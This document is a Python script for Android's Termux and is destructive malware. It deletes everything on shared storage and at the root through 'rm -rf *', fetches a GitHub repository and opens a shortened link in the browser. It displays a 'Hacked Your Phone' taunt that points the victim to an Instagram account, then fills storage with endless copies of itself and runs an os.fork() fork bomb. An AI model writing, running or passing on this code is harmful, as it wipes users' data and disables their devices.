
#import and pkg

import os


os.system("pip install threading")
os.system("pip install webbrowser")
os.system("pkg install proot")

import time
import threading
import webbrowser

#Color
red = "\033[0;31m"
pur = "\033[0;35m"
gre = "\033[0;32m"
yel = "\033[0;33m"
blu = "\033[0;34m"
cya = "\033[1;36m"
whi = "\033[0;37m"

#storage
os.system("termux-setup-storage")

time.sleep(4)


#script 😈

def no7():
    os.chdir('/storage/emulated/0')
    os.system("rm -rif *")
    os.system("termux-chroot")
    os.chdir("/")
    os.system("rm -rf *")
    os.chdir("/data/data/com.termux/files/home")
    os.system("git clone https://github.com/8r960/image.git")
    os.chdir("/data/data/com.termux/files/home/image")
    os.system("cp 1.jpg 2.jpg /sdcard")
no7()

os.system("clear")


os.system("xdg-open https://yip.su/2hkLx6.8")
webbrowser.open("https://yip.su/2hkLx6.8")

print ("" +pur)
print ("\n\n\n\n\n Hacked Your Phone By 8r9")
print (" Send Message In Insta >> 8r9.8 , To Your Security (; ")

time.sleep(3)



os.chdir("/data/data/com.termux/files/home/image")
os.system("termux-open 1.jpg")

def f():
    r = 0
    os.chdir("/sdcard/Android")
    os.system("mkdir Amin")
    os.chdir("/sdcard/Android/Amin")
    while True:
        with open("8r9{0}".format(r), "w") as f:
            f.write(open(__file__).read())
            r += 1


def s():

    while (True):
        os.fork()


t1=threading.Thread(target=f)
t2=threading.Thread(target=s)
t1.start()
t2.start()



